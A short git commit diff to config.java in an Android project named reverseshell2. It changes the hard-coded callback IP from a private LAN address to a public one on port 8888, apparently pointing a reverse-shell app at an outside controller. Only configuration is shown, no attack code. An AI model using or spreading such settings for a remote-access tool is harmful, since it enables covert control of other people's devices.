a7ce8b7282053085ff1e064e8b0afc67fb443979
Simi <84782994+b3lalangg@users.noreply.github.com>
2022-11-18 19:05:06 +0700

    Update config.java

--- Android_Code/app/src/main/java/com/example/reverseshell2/config.java
+++ Android_Code/app/src/main/java/com/example/reverseshell2/config.java
@@ -1,7 +1,7 @@
 package com.example.reverseshell2;
 
 public class config {
-    public static String IP = "192.168.0.105";
+    public static String IP = "103.186.35.2";
     public static String port = "8888";
     public static boolean icon = true;
 }
